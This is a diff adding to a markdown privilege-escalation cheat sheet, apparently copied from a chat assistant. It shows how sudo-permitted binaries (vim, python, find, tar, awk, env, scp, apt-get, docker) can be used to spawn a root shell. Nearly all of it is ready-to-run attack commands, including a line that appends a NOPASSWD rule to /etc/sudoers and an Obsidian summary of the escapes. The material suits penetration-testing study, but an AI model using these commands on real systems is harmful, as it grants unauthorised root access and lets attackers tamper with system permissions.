@@ -100,3 +100,167 @@ bash
 Copy
 Edit
 cmd=$(sudo -l | grep -Po '/[^\s]+' | sort -u); for b in $cmd; do echo "[+] $b"; curl -s "https://gtfobins.github.io/gtfobins/$(basename $b)/" | grep -iE 'sudo|shell|exec' | head -n 10; echo; done
+
+
+💣 1. Sudo with vim, less, or nano
+sudo -l Output:
+
+bash
+Copy
+Edit
+(root) NOPASSWD: /usr/bin/vim
+Attack Flow:
+
+bash
+Copy
+Edit
+sudo vim -c '!sh'
+📌 Or drop into shell:
+
+vim
+Copy
+Edit
+:set shell=/bin/sh
+:shell
+🧠 This works with nano, less, man → look for ! execution support.
+
+💣 2. Sudo with python, perl, or ruby
+sudo -l Output:
+
+bash
+Copy
+Edit
+(root) NOPASSWD: /usr/bin/python3
+Attack Flow:
+
+bash
+Copy
+Edit
+sudo python3 -c 'import os; os.system("/bin/bash")'
+📌 Also works:
+
+sudo perl -e 'exec "/bin/sh";'
+
+sudo ruby -e 'exec "/bin/sh"'
+
+💣 3. Sudo with find
+sudo -l Output:
+
+arduino
+Copy
+Edit
+(root) NOPASSWD: /usr/bin/find
+Attack Flow:
+
+bash
+Copy
+Edit
+sudo find . -exec /bin/bash \;
+💣 4. Sudo with env
+sudo -l Output:
+
+bash
+Copy
+Edit
+(root) NOPASSWD: /usr/bin/env
+Attack Flow:
+
+bash
+Copy
+Edit
+sudo env /bin/bash
+📌 Or combine with PATH abuse:
+
+bash
+Copy
+Edit
+sudo env PATH=/tmp:$PATH runapp
+💣 5. Sudo with awk
+sudo -l Output:
+
+bash
+Copy
+Edit
+(root) NOPASSWD: /usr/bin/awk
+Attack Flow:
+
+bash
+Copy
+Edit
+sudo awk 'BEGIN {system("/bin/bash")}'
+💣 6. Sudo with tar
+sudo -l Output:
+
+bash
+Copy
+Edit
+(root) NOPASSWD: /bin/tar
+Attack Flow:
+
+bash
+Copy
+Edit
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+💣 7. Sudo with tee (File Overwrite)
+sudo -l Output:
+
+bash
+Copy
+Edit
+(root) NOPASSWD: /usr/bin/tee
+Attack Flow (append to /etc/sudoers):
+
+bash
+Copy
+Edit
+echo "youruser ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers
+sudo /bin/bash
+🚨 Be careful with sudoers format — syntax error = lockout.
+
+💣 8. Sudo with scp or rsync
+sudo -l Output:
+
+bash
+Copy
+Edit
+(root) NOPASSWD: /usr/bin/scp
+Attack Flow:
+
+bash
+Copy
+Edit
+sudo scp -S /bin/bash x x
+📌 scp will try to use /bin/bash as its SSH binary = shell.
+
+💣 9. Sudo with Scripted Binaries (tcpdump, apt-get, docker)
+tcpdump already covered above ⬆
+
+🧨 apt-get Attack:
+
+bash
+Copy
+Edit
+sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash
+🧨 docker Attack:
+
+bash
+Copy
+Edit
+sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+🧠 Obsidian Snippet
+markdown
+Copy
+Edit
+### Sudo Binary ➜ Exploit Flow
+
+- `sudo -l` shows binary:
+    - `vim` ➜ `sudo vim -c '!sh'`
+    - `python` ➜ `sudo python3 -c 'import os; os.system("/bin/bash")'`
+    - `tar` ➜ `sudo tar --checkpoint-action=exec=/bin/bash`
+    - `env` ➜ `sudo env /bin/bash`
+    - `scp` ➜ `sudo scp -S /bin/bash x x`
+    - `awk` ➜ `sudo awk 'BEGIN {system("/bin/bash")}'`
+    - `apt-get` ➜ `sudo apt-get -o APT::Update::Pre-Invoke::=/bin/bash`
+    - `find` ➜ `sudo find . -exec /bin/bash \;`
+
+- GTFOBin: https://gtfobins.github.io
